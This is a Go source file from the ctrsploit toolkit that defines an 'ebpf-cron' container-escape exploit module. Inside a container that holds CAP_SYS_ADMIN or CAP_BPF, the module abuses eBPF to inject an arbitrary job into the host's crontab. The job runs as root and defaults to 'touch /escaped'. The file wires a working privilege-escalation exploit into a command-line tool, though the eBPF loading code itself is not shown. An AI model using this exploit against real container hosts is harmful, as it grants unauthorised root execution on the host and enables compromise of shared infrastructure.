package cron

import (
	"github.com/ctrsploit/ctrsploit/prerequisite/capability"
	"github.com/ctrsploit/sploit-spec/pkg/app"
	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
	"github.com/ctrsploit/sploit-spec/pkg/prerequisite"
	"github.com/ctrsploit/sploit-spec/pkg/vul"
	"github.com/urfave/cli/v2"
)

var (
	aliases      = []string{"cron"}
	flagsExploit = []cli.Flag{
		&cli.StringFlag{
			Name:    "job",
			Aliases: []string{"j"},
			Usage:   "",
			Value:   "* * * * * root touch /escaped",
		},
	}
	ExploitCmd = app.Vul2ExploitCmd(&Vul, aliases, flagsExploit, true)
	VulCmd     = app.Vul2VulCmd(&Vul, aliases, nil, flagsExploit, true)
)

type vulnerability struct {
	vul.BaseVulnerability
}

var Vul = vulnerability{
	BaseVulnerability: vul.BaseVulnerability{
		Name:        "ebpf-cron",
		Description: "abuse eBPF to inject malicious job into host's crontab",
		ExeEnv: exeenv.ExeEnv{
			Env:     exeenv.InContainer,
			Check:   exeenv.InContainer,
			Exploit: exeenv.InContainer,
		},
		CheckSecPrerequisites: prerequisite.Or(
			&capability.CapSysAdminBnd,
			&capability.CapBpfBnd,
		),
		ExploitablePrerequisites: &capability.CapSysAdminEff,
	},
}

func (v *vulnerability) Exploit(context *cli.Context) (err error) {
	if err := v.BaseVulnerability.Exploit(context); err != nil {
		return err
	}
	job := context.String("job")
	return Exploit(job)
}

func Exploit(job string) (err error) {
	return Load(job + " #")
}
